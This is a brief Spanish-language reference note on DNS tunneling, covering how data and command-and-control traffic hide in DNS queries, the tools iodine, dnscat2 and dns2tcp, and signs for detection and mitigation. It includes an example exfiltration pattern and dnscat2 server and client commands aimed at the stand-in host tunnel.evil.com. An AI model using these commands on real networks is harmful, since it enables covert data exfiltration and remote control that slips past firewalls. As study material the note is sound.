#reference #Networking

**DNS Tunneling** = encapsular datos (o un canal C2) dentro de consultas y respuestas DNS. Como el DNS (53) casi siempre está permitido y poco inspeccionado, sirve para **exfiltración** y **command & control** evadiendo firewalls y portales cautivos.

![[dns-tunneling.png|1228]]

# Cómo funciona

El atacante controla un dominio (`tunnel.evil.com`) cuyo NS apunta a su servidor. El cliente codifica los datos en **subdominios** de consultas; el servidor responde con datos codificados en registros **TXT/CNAME/NULL**.

```
Exfil:   <datos-base32>.tunnel.evil.com   (consulta)
Control: respuesta TXT con el comando codificado
```

| Pieza | Rol |
|-------|-----|
| Dominio + NS delegado | El servidor del atacante es autoritativo. |
| Subdominio | Canal de subida (datos del cliente). |
| Registro TXT/CNAME/NULL | Canal de bajada (comandos/datos). |

# Herramientas

| Herramienta | Uso |
|-------------|-----|
| **iodine** | Túnel IP completo sobre DNS. |
| **dnscat2** | Canal C2 cifrado sobre DNS. |
| **dns2tcp** | Tunelizar TCP por DNS. |

```bash
# dnscat2 (servidor / cliente)
ruby dnscat2.rb tunnel.evil.com
./dnscat tunnel.evil.com
```

# Detección / mitigación

- **Volumen y frecuencia** anómalos de consultas a un mismo dominio.
- Subdominios largos, alta entropía, muchos TXT/NULL.
- Dominios recién registrados o con TTL muy bajo.
- Bloquear/inspeccionar DNS saliente (solo vía resolver corporativo), DNS firewall, RPZ.

> Relacionado: cualquier protocolo "siempre abierto" sirve de covert channel. El DNS es el favorito por su ubicuidad. Ver [[C2 backdoor]].

# Recursos
### [[DNS_CS]] · [[C2 backdoor]] · [[!DNS Cache Poisoning]]
### [iodine](https://github.com/yarrick/iodine) · [dnscat2](https://github.com/iagox86/dnscat2)
